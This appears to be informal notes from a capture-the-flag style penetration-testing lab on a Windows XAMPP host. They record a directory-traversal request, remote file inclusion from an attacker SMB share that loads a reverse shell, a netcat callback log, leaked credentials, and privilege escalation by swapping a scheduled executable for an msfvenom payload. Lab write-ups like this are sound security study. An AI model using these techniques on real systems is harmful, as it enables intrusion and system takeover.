21 ftp, 135 rpc, 139 smb, 445 smb, 3306 mysql, 4443 web, 8080 IIS web
ftp, smb, rpc all locked down

web 4443 is a xampp page, phpinfo.php shows c:\users\rupert
4443 is only available from localhost

`gobuster dir --url http://192.168.244.53:4443 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64 -x php`
shows us a /site endpoint, upon visiting which, we see a url as `http://192.168.244.53:4443/site/index.php?page=main.php`
This means Dir traversal and FLI test
so we send it over to burp repeater
and what do you konw, `GET /site/index.php?page=../../../../../../../Windows/win.ini HTTP/1.1` gives us the file
we can get rupert's local.txt from burp as well bab4ebb5f767cd8a132d980698c6f51e

from phpinfo.php, we find error_log at C:\xampp\php\logs\php_error_log
but we were'nt able to reach it, or it dint exist
So, we take a page from ippsec's old method, where we try to ping my smb server, and see if we can host a php reverse shell there

`GET /site/index.php?page=//192.168.45.247/my/share HTTP/1.1`
`GET /site/index.php?page=\\192.168.45.247\my\share HTTP/1.1` also works
This gives us rupert's challenge-response, but we arent able to crack it

so, we go with hosting the reverse shell
`impacket-smbserver -smb2support mine $(pwd)`
we succeed, but we get this error instantly, and the shell is lost
```
listening on [any] 1234 ...
connect to [192.168.45.247] from (UNKNOWN) [192.168.244.53] 50264
'uname' is not recognized as an internal or external command,
operable program or batch file.
```
That;s because the php-reverse-shell.php is meant for linux, so we go and get a windows php rev shell, change the ip, port, and os variables in the script
`GET /site/index.php?page=\\192.168.45.247\mine\win_rshell.php HTTP/1.1`
slort/rupert!

Had this not worked, next step woulda been to keep the php 1-liner, and set cmd as iex to download nc, and then next to run the nc.exe

---
some new creds from xampp\passwords.txt
root :  nopassword
xampp-dav-unsecure : ppmax2011 --webdav
seemed like we were wasting time in xampp, so we move on, maybe revist later if no other options

in C:\ we see a Backups dir, where the info.txt says backups every 5 mins
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt

we also see an internal port 14147 which is tftp filezilla

after some head-scratching, we see icacls on the TFTP.EXE is F, so we can modify it
so we create a msfvenom payload, and send it over as TFTP.EXE and wait 5 mins

Admin!